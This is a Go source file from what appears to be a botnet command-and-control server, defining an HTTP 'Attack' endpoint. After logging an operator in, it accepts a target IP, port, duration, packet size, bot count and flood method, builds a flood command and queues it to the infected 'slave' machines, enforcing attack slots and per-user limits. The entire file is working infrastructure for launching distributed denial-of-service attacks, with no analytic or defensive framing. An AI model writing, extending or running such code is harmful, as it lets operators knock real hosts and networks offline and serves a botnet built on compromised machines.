package endpoints

import (
	"cnc/core/attacks"
	"cnc/core/database"
	"cnc/core/masters"
	"cnc/core/slaves"
	"fmt"
	"net"
	"strconv"

	"github.com/gin-gonic/gin"
)

var botCat string

func Attack(c *gin.Context) {
	username := c.Query("username")
	password := c.Query("password")

	gin.SetMode(gin.ReleaseMode)
	loggedIn, userInfo, err := database.DatabaseConnection.TryLogin(username, password, c.ClientIP())
	if err != nil || !loggedIn {
		c.JSON(401, gin.H{"message": "Authentication failed"})
		return
	}

	target := c.Query("target")
	portStr := c.Query("port")
	durationStr := c.Query("duration")
	size := c.Query("size")
	botCount := c.Query("botcount")
	FloodStr := c.Query("method")

	ip := net.ParseIP(target)
	if ip == nil || ip.To4() == nil {
		c.JSON(400, gin.H{"message": "Invalid IPv4 address"})
		return
	}

	
	
	
	
	

	var port int
	if portStr == "" {
		port = 0
	} else {
		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			c.JSON(400, gin.H{"message": "Invalid port"})
			return
		}
	}

	duration, err := strconv.Atoi(durationStr)
	if err != nil || duration <= 0 || duration > 999 {
		c.JSON(400, gin.H{"message": "Invalid duration (should be between 1 and 999 seconds)"})
		return
	}

	var cmd string
	if size == "" {
		cmd = fmt.Sprintf("%s %s %d dport=%d len=1", FloodStr, target, duration, port)
	} else {
		cmd = fmt.Sprintf("%s %s %d dport=%d len=%s", FloodStr, target, duration, port, size)
	}

	isAdmin := 0
	if userInfo.Admin {
		isAdmin = 1
	}

	atk, err := attacks.NewAttack(cmd, isAdmin, username)
	if err != nil {
		c.JSON(500, gin.H{"message": fmt.Sprintf("Error starting the attack: %v", err)})
		return
	}

	buf, err := atk.Build()
	if err != nil {
		c.JSON(500, gin.H{"message": "Error building the attack command"})
		return
	}

	if masters.GlobalSlots >= attacks.MaxGlobalSlots {
		c.JSON(429, gin.H{"message": "All attack slots are in use, please wait."})
		return
	}

	
	botcountt := userInfo.Bots
	if botCount != "" {
		parsedCount, err := strconv.Atoi(botCount)
		if err != nil || parsedCount < -1 {
			c.JSON(400, gin.H{"message": "Invalid botcount (-1 for all or a positive number)"})
			return
		}
		botcountt = parsedCount
	}

	if can, err := database.DatabaseConnection.CanLaunchAttack(username, uint32(duration), cmd, botcountt, 0); !can {
		c.JSON(400, gin.H{"message": fmt.Sprintf("Cannot launch attack: %s", err.Error())})
		return
	}

	
	actualBotCount := botcountt
	if botcountt == -1 {
		
		if botCat == "" {
			actualBotCount = slaves.CL.Count()
		} else {
			
			distribution := slaves.CL.Distribution()
			if count, exists := distribution[botCat]; exists {
				actualBotCount = count
			} else {
				actualBotCount = 0
			}
		}
	}

	slaves.CL.QueueBuf(buf, botcountt, botCat)

	go masters.SlotsCooldown(username)
	c.JSON(200, gin.H{"message": fmt.Sprintf("Command sent to %d clients", actualBotCount)})
}
